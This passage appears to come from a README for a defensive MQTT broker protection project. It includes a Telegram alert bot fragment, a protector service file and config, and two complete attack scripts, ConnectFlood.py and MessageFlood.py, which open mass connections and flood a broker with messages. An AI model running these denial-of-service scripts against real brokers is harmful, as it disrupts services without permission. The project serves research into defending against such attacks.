                f"**Content:**\n{formatted_content}"
            )
            subscribers_to_notify = list(subscribed_chat_ids)
            for chat_id in subscribers_to_notify:
                try:
                    await application.bot.send_message(
                        chat_id=chat_id, text=telegram_message, parse_mode='MarkdownV2'
                    )
                except Forbidden:
                    print(f"User {chat_id} blocked the bot. Removing.")
                    if chat_id in subscribed_chat_ids:
                        subscribed_chat_ids.remove(chat_id)
                    save_subscribers()
                except Exception as e:
                    print(f"Failed to send to {chat_id}: {e}")
        except queue.Empty:
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"Error in message processing loop: {e}")

async def post_init(application: Application):
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(MQTT_BROKER, MQTT_PORT, 60)
        client.loop_start()
        print("MQTT client started and running in the background.")
    except Exception as e:
        print(f"❌ Failed to connect to MQTT broker: {e}")
    asyncio.create_task(process_mqtt_messages(application))

async def post_shutdown(application: Application):
    if client.is_connected():
        print("Shutting down: Disconnecting MQTT client...")
        client.loop_stop()
        client.disconnect()
    print("Bot shutdown complete.")

if __name__ == '__main__':
    print("🚀 Starting MQTT Telegram Bot...")
    load_subscribers()

    application = (
        Application.builder()
        .token(TELEGRAM_TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))

    application.run_polling()
```
</details>

<details>
<summary><b>ConnectFlood.py (Attack Script)</b></summary>
  
```Python

#!/usr/bin/python3
import paho.mqtt.client as mqtt
import time
from tqdm import tqdm
import subprocess
import sys

def parsing_parameters():
    l = len(sys.argv)
    port = 1883
    keepAlive = 60

    if (l == 1):
        print('''\n    Usage:
    python3 ConnectFlood.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>
    -a\tIP address of MQTT broker
    -p\tport of MQTT broker (default 1883)
    -k\tkeep alive parameter of MQTT protocol (default 60 sec)
        ''')
        exit()

    for i in range(1, l):
        if (sys.argv[i] == '-p' and i < l):
            port = sys.argv[i + 1]
        elif (sys.argv[i] == '-k' and i < l):
            if (int(sys.argv[i + 1]) > 65535 or int(sys.argv[i + 1]) <= 0):
                keepAlive = 60
            else:
                keepAlive = sys.argv[i + 1]
        elif (sys.argv[i] == '-a' and i < l):
            broker_address = sys.argv[i + 1]
        elif ((sys.argv[i] == '--help' or sys.argv[i] == '-h') and i <= l):
            print('''\nUsage:
    python3 ConnectFlood.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>
            ''')
            exit()
    return broker_address, int(port), int(keepAlive)

try:
    _broker_address, _port, _keepAlive = parsing_parameters()
    vett = []
    print('\nRequesting connections...\n')
    # Connect up to a common limit, e.g., 2000 clients
    for i in tqdm(range(2000)):
        client_id = f'client{i}'
        client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        vett.append(client)
        try:
            client.connect(_broker_address, _port, _keepAlive)
            client.loop_start() # Use loop_start for non-blocking connect
        except Exception as e:
            print(f"\nFailed to connect client {i}: {e}. Maybe the server is full.")
            break
    print('\nRequests sent! Attack is running...\n')
    end = input('[ Press any key to stop the attack ]\n')
    print('[ Attack terminated. Disconnecting clients... ]\n')
    for client in vett:
        client.loop_stop()
        client.disconnect()

except KeyboardInterrupt:
    subprocess.call('clear', shell=True)
    print('ERROR: unexpected attack stop')
```
</details>

<details>
<summary><b>MessageFlood.py (Attack Script)</b></summary>

```Python

import paho.mqtt.client as mqtt
import time
import argparse
import uuid

# --- Default Settings ---
BROKER_ADDRESS = "127.0.0.1"
BROKER_PORT = 1883
TOPIC = "test/topic"
MESSAGE_COUNT = 500
DELAY = 0.01

# --- Argument Parser Setup ---
parser = argparse.ArgumentParser(description="MQTT Message Flood Tester")
parser.add_argument('-a', '--address', type=str, default=BROKER_ADDRESS, help=f"Broker address (default: {BROKER_ADDRESS})")
parser.add_argument('-p', '--port', type=int, default=BROKER_PORT, help=f"Broker port (default: {BROKER_PORT})")
parser.add_argument('-t', '--topic', type=str, default=TOPIC, help=f"Topic to publish to (default: {TOPIC})")
parser.add_argument('-c', '--count', type=int, default=MESSAGE_COUNT, help=f"Number of messages to send (default: {MESSAGE_COUNT})")
parser.add_argument('-d', '--delay', type=float, default=DELAY, help=f"Delay between messages in seconds (default: {DELAY})")

args = parser.parse_args()

# --- Script Logic ---
client_id = f"flood_tester_{uuid.uuid4()}"
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=client_id)

def on_connect(client, userdata, flags, rc, properties):
    if rc == 0:
        print(f"Connected to broker at {args.address}:{args.port}")
    else:
        print(f"Failed to connect, return code {rc}\n")
        exit()

def on_disconnect(client, userdata, rc, properties):
    print("Disconnected from broker.")

client.on_connect = on_connect
client.on_disconnect = on_disconnect

try:
    print("Attempting to connect...")
    client.connect(args.address, args.port, 60)
    client.loop_start()
    time.sleep(1)

    if not client.is_connected():
        print("Could not establish connection. Exiting.")
        exit()

    print(f"Starting to send {args.count} messages to topic '{args.topic}'...")
    for i in range(args.count):
        payload = f"Message {i+1} from {client_id}"
        result = client.publish(args.topic, payload)
        
        if result.rc != 0:
            print(f"\nFailed to publish message {i+1}. Connection might be dropped.")
            break
            
        print(f"Sent message {i+1}/{args.count}", end='\r')
        time.sleep(args.delay)

    print(f"\nFinished sending messages.")

except KeyboardInterrupt:
    print("\nScript interrupted by user.")
except Exception as e:
    print(f"\nAn error occurred: {e}")
finally:
    client.loop_stop()
    client.disconnect()
    print("Script finished.")
```
</details>

<details>
<summary><b>mosquitto_protector.service conf file</b></summary>
 
 ```
[Unit]
Description=Mosquitto Protector Service
# This ensures the service starts after the network and mosquitto broker are ready
After=network.target mosquitto.service
BindsTo=mosquitto.service


[Service]
# The script needs root privileges for iptables
User=root

#ExecStartPre=/bin/sh -c 'systemctl is-active --quiet mosquitto.service'
# IMPORTANT: Replace the path below with the actual, absolute path to your script
ExecStart=/usr/bin/python3 /usr/local/bin/MQTTDosProtected.py

# Automatically restart the service if it fails
Restart=on-failure
RestartSec=5

[Install]
# This makes the service start on boot
WantedBy=multi-user.target
 ```
</details>
<details>
<summary><b>config.ini file</b></summary>
 
```
 # ----------------------------------------------------------------
# Configuration file for Mosquitto Protector Script
# ----------------------------------------------------------------

[General]
# Duration in seconds to ban a malicious IP.
ban_duration_seconds = 60
# Interval in seconds between each check cycle.
check_interval_seconds = 2

[Protection]
# Ban an IP if it has more than this many active connections.
max_connections_per_ip = 35
# Number of idle clients from any IP that will trigger a ban.
max_idle_clients_trigger = 25
# Time in seconds a client can be idle before being considered for a ban.
idle_timeout_seconds = 60
# Maximum allowed message size in bytes (e.g., 1 * 1024 * 1024 for 1MB).
max_message_size_bytes = 10485760
# Ban a client if it sends more than 'rate_limit_count' messages
# within 'rate_limit_seconds'.
[RateLimiting]
rate_limit_count = 100
rate_limit_seconds = 10

[MQTT]
# MQTT broker address and port for management client.
broker = localhost
port = 1883
# Topic to publish security alerts to.
alert_topic = security/protector/alerts

[Paths]
# Path to the main Mosquitto log file.
mosquitto_log_file = /var/log/mosquitto/mosquitto.log
# File to store the list of currently banned IPs.
banned_ips_file = /var/lib/mosquitto_protector/banned_ips.txt
# File to store the last read position of the Mosquitto log.
log_position_file = /var/lib/mosquitto_protector/log_position.txt
# Path to the Tor exit node blacklist file.
tor_blacklist_file = /etc/mosquitto_protector/tor_blacklist.txt

[Whitelists]
# List of IPs to never ban. Put each IP on a new line.
whitelisted_ips = 
    127.0.0.1
    YOUR_SERVER_PUBLIC_IP

# List of client ID patterns to ignore. Supports '*' at the end.
# Put each pattern on a new line.
whitelisted_client_id_patterns =
    protector_client
    telegram_bot_*
    DoorSensorTransient

# List of allowed topics for publishing. Supports '+' and '#'.
# Put each topic on a new line.
allowed_publish_topics =
    security/protector/alerts
    sensors/+/temperature/+
    sensors/+/humidity/+
    devices/+/status/+
    esp32/dht22/status/+
    esp32/dht22/data
    esp32/dht22/commands
```
 </details>
<details>
<summary><b>requirements.txt</b></summary>
  
```
paho-mqtt
psutil
requests
python-telegram-bot
```
</details>

## ⚠️ Disclaimer and Ethical Warning
This project and its accompanying tools were created for educational and research purposes only. The goal is to demonstrate and understand the vulnerabilities in the MQTT protocol to build better defense mechanisms.

Using any of the included attack scripts to test or attack systems that you do not own or do not have explicit, written permission to test is illegal and considered a cybercrime.

The authors and contributors of this project disclaim all liability and are not responsible for any damage or misuse of these tools. We encourage using the knowledge gained from this project to enhance security defenses and contribute to building a safer digital environment.
